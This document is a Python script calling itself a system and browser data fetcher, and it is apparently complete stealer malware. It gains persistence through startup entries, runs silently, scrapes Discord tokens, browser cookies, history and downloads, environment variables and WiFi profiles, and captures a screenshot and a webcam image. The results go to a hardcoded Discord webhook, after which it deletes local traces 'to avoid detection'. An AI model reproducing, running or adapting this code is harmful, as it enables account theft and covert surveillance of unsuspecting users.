
#!/usr/bin/env python3
"""
Advanced System & Browser Data Fetcher - Comprehensive information gathering tool
"""

import os
import sys
import json
import sqlite3
import base64
import platform
import socket
import uuid
import subprocess
import re
import time
import glob
import shutil
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
import logging

import requests
import psutil

# Optional modules
SCREENSHOT_AVAILABLE = False
WEBCAM_AVAILABLE = False
try:
    if os.environ.get('DISPLAY'):
        import pyautogui
        SCREENSHOT_AVAILABLE = True
except (ImportError, Exception):
    pass

try:
    import cv2
    WEBCAM_AVAILABLE = True
except ImportError:
    WEBCAM_AVAILABLE = False

# Browser data extraction libraries
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

class SystemDataFetcher:
    """Advanced system and browser data fetcher"""
    
    def __init__(self, silent_mode=True):
        self.data = {}
        self.browser_paths = self._get_browser_paths()
        self.silent_mode = silent_mode
        
        # Setup logging
        if not silent_mode:
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler('system_data.log'),
                    logging.StreamHandler()
                ]
            )
        else:
            # Silent logging
            logging.basicConfig(
                level=logging.CRITICAL,
                handlers=[logging.NullHandler()]
            )
        
        self.logger = logging.getLogger(__name__)
    
    def add_to_startup(self):
        """Add the program to startup"""
        try:
            if platform.system() == "Windows":
                # Get the current executable path
                if getattr(sys, 'frozen', False):
                    # Running as compiled executable
                    exe_path = sys.executable
                else:
                    # Running as script
                    exe_path = os.path.abspath(__file__)
                
                # Add to Windows startup registry
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                try:
                    with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as registry_key:
                        winreg.SetValueEx(registry_key, "SystemDataFetcher", 0, winreg.REG_SZ, exe_path)
                    return True
                except:
                    pass
                
                # Also try copying to startup folder
                try:
                    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    if os.path.exists(startup_folder):
                        startup_file = os.path.join(startup_folder, 'SystemDataFetcher.exe')
                        if exe_path != startup_file:
                            shutil.copy2(exe_path, startup_file)
                    return True
                except:
                    pass
                    
            elif platform.system() == "Darwin":  # macOS
                # Create LaunchAgent
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.systemdatafetcher.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable if not getattr(sys, 'frozen', False) else sys.executable}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
                
                launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
                os.makedirs(launch_agents_dir, exist_ok=True)
                
                plist_path = os.path.join(launch_agents_dir, "com.systemdatafetcher.agent.plist")
                with open(plist_path, 'w') as f:
                    f.write(plist_content)
                
                subprocess.run(["launchctl", "load", plist_path], capture_output=True)
                return True
                
            elif platform.system() == "Linux":
                # Create autostart desktop entry
                autostart_dir = os.path.expanduser("~/.config/autostart")
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_content = f"""[Desktop Entry]
Type=Application
Name=SystemDataFetcher
Exec={sys.executable if not getattr(sys, 'frozen', False) else sys.executable}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true"""
                
                desktop_path = os.path.join(autostart_dir, "systemdatafetcher.desktop")
                with open(desktop_path, 'w') as f:
                    f.write(desktop_content)
                return True
                
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error adding to startup: {str(e)}")
        
        return False
    
    def capture_webcam(self) -> Optional[str]:
        """Capture image from webcam"""
        if not WEBCAM_AVAILABLE:
            return None
            
        try:
            # Try to access webcam
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return None
            
            # Give camera time to warm up
            time.sleep(1)
            
            # Capture frame
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam_{timestamp}.jpg"
                cv2.imwrite(filename, frame)
                return filename
                
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error capturing webcam: {str(e)}")
        
        return None
    
    def get_discord_tokens(self) -> List[str]:
        """Extract Discord tokens from various locations"""
        tokens = []
        
        try:
            # Common Discord paths
            if platform.system() == "Windows":
                discord_paths = [
                    os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
                    os.path.expandvars(r"%APPDATA%\discordcanary\Local Storage\leveldb"),
                    os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\leveldb"),
                    os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable\Local Storage\leveldb"),
                    os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
                    os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
                    os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
                ]
            elif platform.system() == "Darwin":
                home = os.path.expanduser("~")
                discord_paths = [
                    f"{home}/Library/Application Support/discord/Local Storage/leveldb",
                    f"{home}/Library/Application Support/discordcanary/Local Storage/leveldb",
                    f"{home}/Library/Application Support/discordptb/Local Storage/leveldb",
                    f"{home}/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb",
                    f"{home}/Library/Application Support/Firefox/Profiles"
                ]
            else:  # Linux
                home = os.path.expanduser("~")
                discord_paths = [
                    f"{home}/.config/discord/Local Storage/leveldb",
                    f"{home}/.config/discordcanary/Local Storage/leveldb",
                    f"{home}/.config/discordptb/Local Storage/leveldb",
                    f"{home}/.config/google-chrome/Default/Local Storage/leveldb",
                    f"{home}/.mozilla/firefox"
                ]
            
            # Token patterns
            token_patterns = [
                r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',  # Bot token
                r'mfa\.[\w-]{84}',  # MFA token
                r'[\w-]{59}'  # User token
            ]
            
            for path in discord_paths:
                if os.path.exists(path):
                    try:
                        # Search in leveldb files
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file.endswith(('.log', '.ldb')):
                                    file_path = os.path.join(root, file)
                                    try:
                                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                            content = f.read()
                                            
                                        for pattern in token_patterns:
                                            found_tokens = re.findall(pattern, content)
                                            for token in found_tokens:
                                                if token not in tokens and len(token) > 20:
                                                    tokens.append(token)
                                                    
                                    except:
                                        # Try binary read for leveldb files
                                        try:
                                            with open(file_path, 'rb') as f:
                                                content = f.read().decode('utf-8', errors='ignore')
                                                
                                            for pattern in token_patterns:
                                                found_tokens = re.findall(pattern, content)
                                                for token in found_tokens:
                                                    if token not in tokens and len(token) > 20:
                                                        tokens.append(token)
                                        except:
                                            continue
                    except:
                        continue
                        
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error extracting Discord tokens: {str(e)}")
        
        return tokens[:10]  # Limit to 10 tokens
    
    def _get_browser_paths(self) -> Dict[str, Dict[str, str]]:
        """Get browser data paths for different operating systems"""
        system = platform.system()
        home = Path.home()
        
        paths = {}
        
        if system == "Windows":
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            
            paths = {
                'chrome': {
                    'cookies': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
                    'history': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'History'),
                    'bookmarks': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks'),
                    'passwords': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
                    'downloads': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'History')
                },
                'firefox': {
                    'profiles': os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles'),
                    'cookies': 'cookies.sqlite',
                    'history': 'places.sqlite',
                    'bookmarks': 'places.sqlite',
                    'passwords': 'logins.json'
                },
                'edge': {
                    'cookies': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'),
                    'history': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
                    'bookmarks': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Bookmarks')
                }
            }
        
        elif system == "Darwin":  # macOS
            paths = {
                'chrome': {
                    'cookies': str(home / 'Library/Application Support/Google/Chrome/Default/Cookies'),
                    'history': str(home / 'Library/Application Support/Google/Chrome/Default/History'),
                    'bookmarks': str(home / 'Library/Application Support/Google/Chrome/Default/Bookmarks'),
                    'passwords': str(home / 'Library/Application Support/Google/Chrome/Default/Login Data')
                },
                'firefox': {
                    'profiles': str(home / 'Library/Application Support/Firefox/Profiles'),
                    'cookies': 'cookies.sqlite',
                    'history': 'places.sqlite',
                    'bookmarks': 'places.sqlite'
                },
                'safari': {
                    'cookies': str(home / 'Library/Cookies/Cookies.binarycookies'),
                    'history': str(home / 'Library/Safari/History.db'),
                    'bookmarks': str(home / 'Library/Safari/Bookmarks.plist')
                }
            }
        
        else:  # Linux
            paths = {
                'chrome': {
                    'cookies': str(home / '.config/google-chrome/Default/Cookies'),
                    'history': str(home / '.config/google-chrome/Default/History'),
                    'bookmarks': str(home / '.config/google-chrome/Default/Bookmarks'),
                    'passwords': str(home / '.config/google-chrome/Default/Login Data')
                },
                'firefox': {
                    'profiles': str(home / '.mozilla/firefox'),
                    'cookies': 'cookies.sqlite',
                    'history': 'places.sqlite',
                    'bookmarks': 'places.sqlite'
                }
            }
        
        return paths
    
    def get_system_info(self) -> Dict[str, Any]:
        """Gather comprehensive system information"""
        try:
            # Get public IP
            try:
                public_ip = requests.get('https://api.ipify.org', timeout=10).text
            except:
                try:
                    public_ip = requests.get('https://httpbin.org/ip', timeout=10).json().get('origin', 'Unknown')
                except:
                    public_ip = 'Could not retrieve'
            
            # Get local IP
            try:
                local_ip = socket.gethostbyname(socket.gethostname())
            except:
                local_ip = 'Unknown'
            
            # Get hardware info
            cpu_info = {}
            try:
                cpu_info = {
                    'physical_cores': psutil.cpu_count(logical=False),
                    'logical_cores': psutil.cpu_count(logical=True),
                    'max_frequency': psutil.cpu_freq().max if psutil.cpu_freq() else 'Unknown',
                    'current_frequency': psutil.cpu_freq().current if psutil.cpu_freq() else 'Unknown',
                    'cpu_percent': psutil.cpu_percent(interval=1)
                }
            except:
                pass
            
            # Get memory info
            memory = psutil.virtual_memory()
            
            # Get disk info
            disk_info = []
            try:
                partitions = psutil.disk_partitions()
                for partition in partitions:
                    try:
                        partition_usage = psutil.disk_usage(partition.mountpoint)
                        disk_info.append({
                            'device': partition.device,
                            'filesystem': partition.fstype,
                            'total_size': partition_usage.total,
                            'used': partition_usage.used,
                            'free': partition_usage.free,
                            'percentage': (partition_usage.used / partition_usage.total) * 100
                        })
                    except PermissionError:
                        continue
            except:
                pass
            
            # Get network info
            network_info = self.get_network_info()
            
            system_data = {
                'timestamp': datetime.now().isoformat(),
                'basic_info': {
                    'system': platform.system(),
                    'node_name': platform.node(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'machine': platform.machine(),
                    'processor': platform.processor(),
                    'architecture': platform.architecture(),
                    'python_version': platform.python_version(),
                    'python_build': platform.python_build(),
                    'python_compiler': platform.python_compiler()
                },
                'network': {
                    'hostname': socket.gethostname(),
                    'local_ip': local_ip,
                    'public_ip': public_ip,
                    'interfaces': network_info
                },
                'hardware': {
                    'cpu': cpu_info,
                    'memory': {
                        'total': memory.total,
                        'available': memory.available,
                        'percent': memory.percent,
                        'used': memory.used,
                        'free': memory.free
                    },
                    'disk': disk_info
                },
                'processes': self.get_running_processes(),
                'environment': dict(os.environ),
                'discord_tokens': self.get_discord_tokens()
            }
            
            return system_data
            
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error gathering system info: {str(e)}")
            return {}
    
    def get_network_info(self) -> Dict[str, Any]:
        """Get detailed network interface information"""
        network_data = {}
        
        try:
            # Get network interfaces
            interfaces = psutil.net_if_addrs()
            stats = psutil.net_if_stats()
            
            for interface_name, interface_addresses in interfaces.items():
                interface_data = {
                    'addresses': [],
                    'stats': {}
                }
                
                # Get addresses
                for address in interface_addresses:
                    addr_info = {
                        'family': str(address.family),
                        'address': address.address,
                        'netmask': address.netmask,
                        'broadcast': address.broadcast
                    }
                    interface_data['addresses'].append(addr_info)
                
                # Get interface stats
                if interface_name in stats:
                    stat = stats[interface_name]
                    interface_data['stats'] = {
                        'is_up': stat.isup,
                        'duplex': str(stat.duplex),
                        'speed': stat.speed,
                        'mtu': stat.mtu
                    }
                
                network_data[interface_name] = interface_data
            
            # Get network connections
            try:
                connections = psutil.net_connections()
                network_data['connections'] = []
                
                for conn in connections[:50]:  # Limit to first 50 connections
                    conn_data = {
                        'fd': conn.fd,
                        'family': str(conn.family),
                        'type': str(conn.type),
                        'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                        'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                        'status': conn.status,
                        'pid': conn.pid
                    }
                    network_data['connections'].append(conn_data)
            except:
                pass
                
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error getting network info: {str(e)}")
        
        return network_data
    
    def get_running_processes(self) -> List[Dict[str, Any]]:
        """Get information about running processes"""
        processes = []
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
                try:
                    proc_info = proc.info
                    proc_info['create_time'] = proc.create_time()
                    proc_info['status'] = proc.status()
                    processes.append(proc_info)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
                    
            # Sort by memory usage and take top 20
            processes.sort(key=lambda x: x.get('memory_percent', 0), reverse=True)
            return processes[:20]
            
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error getting processes: {str(e)}")
            return []
    
    def get_browser_cookies(self, browser: str = 'chrome') -> List[Dict[str, Any]]:
        """Extract cookies from browser"""
        cookies = []
        
        try:
            if browser in self.browser_paths:
                cookie_path = self.browser_paths[browser].get('cookies')
                
                if cookie_path and os.path.exists(cookie_path):
                    # Create a copy of the database to avoid locking issues
                    temp_path = cookie_path + '.temp'
                    import shutil
                    shutil.copy2(cookie_path, temp_path)
                    
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    
                    # Chrome/Edge cookie format
                    if browser in ['chrome', 'edge']:
                        cursor.execute("""
                            SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, is_secure, is_httponly
                            FROM cookies
                            ORDER BY last_access_utc DESC
                            LIMIT 100
                        """)
                    
                    for row in cursor.fetchall():
                        cookie_data = {
                            'host': row[0],
                            'name': row[1],
                            'value': row[2][:100] if row[2] else '',  # Truncate value
                            'creation_time': row[3],
                            'last_access': row[4],
                            'expires': row[5],
                            'secure': bool(row[6]),
                            'http_only': bool(row[7])
                        }
                        cookies.append(cookie_data)
                    
                    conn.close()
                    os.remove(temp_path)
                    
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error extracting {browser} cookies: {str(e)}")
        
        return cookies
    
    def get_browser_history(self, browser: str = 'chrome') -> List[Dict[str, Any]]:
        """Extract browsing history from browser"""
        history = []
        
        try:
            if browser in self.browser_paths:
                history_path = self.browser_paths[browser].get('history')
                
                if history_path and os.path.exists(history_path):
                    # Create a copy of the database
                    temp_path = history_path + '.temp'
                    import shutil
                    shutil.copy2(history_path, temp_path)
                    
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    
                    # Chrome/Edge history format
                    if browser in ['chrome', 'edge']:
                        cursor.execute("""
                            SELECT url, title, visit_count, last_visit_time
                            FROM urls
                            ORDER BY last_visit_time DESC
                            LIMIT 100
                        """)
                    
                    for row in cursor.fetchall():
                        history_data = {
                            'url': row[0],
                            'title': row[1][:100] if row[1] else '',  # Truncate title
                            'visit_count': row[2],
                            'last_visit': row[3]
                        }
                        history.append(history_data)
                    
                    conn.close()
                    os.remove(temp_path)
                    
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error extracting {browser} history: {str(e)}")
        
        return history
    
    def get_browser_bookmarks(self, browser: str = 'chrome') -> List[Dict[str, Any]]:
        """Extract bookmarks from browser"""
        bookmarks = []
        
        try:
            if browser in self.browser_paths:
                bookmarks_path = self.browser_paths[browser].get('bookmarks')
                
                if bookmarks_path and os.path.exists(bookmarks_path):
                    with open(bookmarks_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                    
                    # Chrome/Edge bookmarks format
                    if browser in ['chrome', 'edge']:
                        def extract_bookmarks(node, folder_path=""):
                            if node.get('type') == 'url':
                                bookmarks.append({
                                    'name': node.get('name', ''),
                                    'url': node.get('url', ''),
                                    'folder': folder_path,
                                    'date_added': node.get('date_added', '')
                                })
                            elif node.get('type') == 'folder':
                                folder_name = node.get('name', '')
                                new_path = f"{folder_path}/{folder_name}" if folder_path else folder_name
                                for child in node.get('children', []):
                                    extract_bookmarks(child, new_path)
                        
                        # Extract from bookmark bar and other bookmarks
                        roots = data.get('roots', {})
                        for root_name, root_data in roots.items():
                            if isinstance(root_data, dict) and 'children' in root_data:
                                for child in root_data['children']:
                                    extract_bookmarks(child, root_name)
                    
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error extracting {browser} bookmarks: {str(e)}")
        
        return bookmarks
    
    def get_browser_downloads(self, browser: str = 'chrome') -> List[Dict[str, Any]]:
        """Extract download history from browser"""
        downloads = []
        
        try:
            if browser in self.browser_paths:
                downloads_path = self.browser_paths[browser].get('downloads', self.browser_paths[browser].get('history'))
                
                if downloads_path and os.path.exists(downloads_path):
                    temp_path = downloads_path + '.temp'
                    import shutil
                    shutil.copy2(downloads_path, temp_path)
                    
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    
                    # Chrome/Edge downloads format
                    if browser in ['chrome', 'edge']:
                        cursor.execute("""
                            SELECT current_path, target_path, start_time, end_time, total_bytes, state
                            FROM downloads
                            ORDER BY start_time DESC
                            LIMIT 50
                        """)
                    
                        for row in cursor.fetchall():
                            download_data = {
                                'current_path': row[0],
                                'target_path': row[1],
                                'start_time': row[2],
                                'end_time': row[3],
                                'total_bytes': row[4],
                                'state': row[5]
                            }
                            downloads.append(download_data)
                    
                    conn.close()
                    os.remove(temp_path)
                    
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error extracting {browser} downloads: {str(e)}")
        
        return downloads
    
    def take_screenshot(self) -> Optional[str]:
        """Take a screenshot of the current screen"""
        if not SCREENSHOT_AVAILABLE:
            return None
            
        try:
            # Import pyautogui only when needed and available
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot_path = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
            screenshot.save(screenshot_path)
            return screenshot_path
            
        except Exception as e:
            if not self.silent_mode:
                self.logger.warning(f"Screenshot not available in this environment: {e}")
            return None
    
    def get_wifi_info(self) -> Dict[str, Any]:
        """Get WiFi network information"""
        wifi_data = {}
        
        try:
            if platform.system() == "Windows":
                # Windows netsh command
                output = subprocess.check_output("netsh wlan show interfaces", shell=True).decode(errors="ignore")
                
                # Parse WiFi info
                ssid_match = re.search(r"^\s*SSID\s*:\s*(.+)$", output, re.MULTILINE)
                bssid_match = re.search(r"^\s*BSSID\s*:\s*(.+)$", output, re.MULTILINE)
                signal_match = re.search(r"^\s*Signal\s*:\s*(.+)$", output, re.MULTILINE)
                auth_match = re.search(r"^\s*Authentication\s*:\s*(.+)$", output, re.MULTILINE)
                
                wifi_data = {
                    'ssid': ssid_match.group(1).strip() if ssid_match else 'Unknown',
                    'bssid': bssid_match.group(1).strip() if bssid_match else 'Unknown',
                    'signal': signal_match.group(1).strip() if signal_match else 'Unknown',
                    'authentication': auth_match.group(1).strip() if auth_match else 'Unknown'
                }
                
                # Get available networks
                try:
                    available_output = subprocess.check_output("netsh wlan show profiles", shell=True).decode(errors="ignore")
                    profiles = re.findall(r"All User Profile\s*:\s*(.+)", available_output)
                    wifi_data['available_networks'] = [profile.strip() for profile in profiles]
                except:
                    pass
                    
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error getting WiFi info: {str(e)}")
        
        return wifi_data
    
    def collect_all_data(self) -> Dict[str, Any]:
        """Collect all available system and browser data"""
        if not self.silent_mode:
            print("Starting comprehensive data collection...")
        
        all_data = {
            'collection_timestamp': datetime.now().isoformat(),
            'system_info': self.get_system_info(),
            'wifi_info': self.get_wifi_info(),
            'browser_data': {}
        }
        
        # Collect browser data for each available browser
        browsers = ['chrome', 'firefox', 'edge', 'safari']
        
        for browser in browsers:
            if browser in self.browser_paths:
                browser_data = {
                    'cookies': self.get_browser_cookies(browser),
                    'history': self.get_browser_history(browser),
                    'bookmarks': self.get_browser_bookmarks(browser),
                    'downloads': self.get_browser_downloads(browser)
                }
                
                # Only include if we found data
                if any(browser_data.values()):
                    all_data['browser_data'][browser] = browser_data
        
        # Take screenshot
        screenshot_path = self.take_screenshot()
        if screenshot_path:
            all_data['screenshot_path'] = screenshot_path
        
        # Capture webcam
        webcam_path = self.capture_webcam()
        if webcam_path:
            all_data['webcam_path'] = webcam_path
        
        if not self.silent_mode:
            print("Data collection completed")
        return all_data
    
    def save_data(self, data: Dict[str, Any], filename: Optional[str] = None) -> str:
        """Save collected data to file"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"system_data_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False, default=str)
            
            if not self.silent_mode:
                print(f"Data saved to {filename}")
            return filename
            
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error saving data: {str(e)}")
            return ""
    
    def send_to_webhook(self, data: Dict[str, Any], webhook_url: str) -> bool:
        """Send collected data to a webhook URL"""
        try:
            # Prepare data for sending (limit size)
            summary_data = {
                'timestamp': data.get('collection_timestamp'),
                'system': {
                    'os': data.get('system_info', {}).get('basic_info', {}).get('system'),
                    'hostname': data.get('system_info', {}).get('network', {}).get('hostname'),
                    'public_ip': data.get('system_info', {}).get('network', {}).get('public_ip'),
                    'local_ip': data.get('system_info', {}).get('network', {}).get('local_ip')
                },
                'wifi': data.get('wifi_info', {}),
                'discord_tokens': data.get('system_info', {}).get('discord_tokens', []),
                'browser_summary': {}
            }
            
            # Add browser data summaries
            for browser, browser_data in data.get('browser_data', {}).items():
                summary_data['browser_summary'][browser] = {
                    'cookies_count': len(browser_data.get('cookies', [])),
                    'history_count': len(browser_data.get('history', [])),
                    'bookmarks_count': len(browser_data.get('bookmarks', [])),
                    'downloads_count': len(browser_data.get('downloads', []))
                }
            
            # Send summary
            response = requests.post(webhook_url, json={'content': f"```json\n{json.dumps(summary_data, indent=2)}\n```"}, timeout=30)
            
            # Send screenshot if available
            screenshot_path = data.get('screenshot_path')
            if screenshot_path and os.path.exists(screenshot_path):
                try:
                    with open(screenshot_path, 'rb') as f:
                        files = {'file': (screenshot_path, f, 'image/png')}
                        requests.post(webhook_url, files=files, timeout=30)
                except:
                    pass
            
            # Send webcam if available
            webcam_path = data.get('webcam_path')
            if webcam_path and os.path.exists(webcam_path):
                try:
                    with open(webcam_path, 'rb') as f:
                        files = {'file': (webcam_path, f, 'image/jpeg')}
                        requests.post(webhook_url, files=files, timeout=30)
                except:
                    pass
            
            return response.status_code == 204 or response.status_code == 200
                
        except Exception as e:
            if not self.silent_mode:
                self.logger.error(f"Error sending to webhook: {str(e)}")
            return False


def main():
    """Main execution function"""
    # Check if running as compiled executable
    is_executable = getattr(sys, 'frozen', False)
    
    # Silent mode for executable
    silent_mode = is_executable
    
    # Initialize the fetcher
    fetcher = SystemDataFetcher(silent_mode=silent_mode)
    
    # Add to startup on first run
    try:
        fetcher.add_to_startup()
    except:
        pass
    
    if not silent_mode:
        print("🔍 Advanced System & Browser Data Fetcher")
        print("=" * 50)
        print("📊 Collecting comprehensive system and browser data...")
    
    # Collect all data
    all_data = fetcher.collect_all_data()
    
    # Save data locally
    filename = fetcher.save_data(all_data)
    
    if not silent_mode:
        # Display summary
        print("\n📋 COLLECTION SUMMARY:")
        print(f"   System Info: ✅ Collected")
        print(f"   Network Info: ✅ Collected")
        print(f"   WiFi Info: ✅ Collected")
        
        discord_tokens = all_data.get('system_info', {}).get('discord_tokens', [])
        if discord_tokens:
            print(f"   Discord Tokens: ✅ {len(discord_tokens)} found")
        
        browser_data = all_data.get('browser_data', {})
        for browser, data in browser_data.items():
            cookies_count = len(data.get('cookies', []))
            history_count = len(data.get('history', []))
            bookmarks_count = len(data.get('bookmarks', []))
            downloads_count = len(data.get('downloads', []))
            
            print(f"   {browser.capitalize()}: {cookies_count} cookies, {history_count} history, {bookmarks_count} bookmarks, {downloads_count} downloads")
        
        if 'screenshot_path' in all_data:
            print(f"   Screenshot: ✅ {all_data['screenshot_path']}")
        
        if 'webcam_path' in all_data:
            print(f"   Webcam: ✅ {all_data['webcam_path']}")
    
    # Send to webhook
    webhook_url = 'https://discord.com/api/webhooks/1389119070485483592/1fTo1DhpRV9saVyJJpnY4J0ytgoHPUev7y3uee28UvhteAxoQ60eW7qmp_UId3HKLW5g'
    
    if webhook_url:
        success = fetcher.send_to_webhook(all_data, webhook_url)
        if not silent_mode:
            if success:
                print("✅ Data sent successfully!")
            else:
                print("❌ Failed to send data")
    
    if not silent_mode:
        print(f"\n🎉 Collection completed!")
    
    # Clean up files in silent mode
    if silent_mode:
        try:
            # Remove generated files to avoid detection
            if filename and os.path.exists(filename):
                os.remove(filename)
            
            screenshot_path = all_data.get('screenshot_path')
            if screenshot_path and os.path.exists(screenshot_path):
                os.remove(screenshot_path)
            
            webcam_path = all_data.get('webcam_path')
            if webcam_path and os.path.exists(webcam_path):
                os.remove(webcam_path)
        except:
            pass


if __name__ == "__main__":
    main()
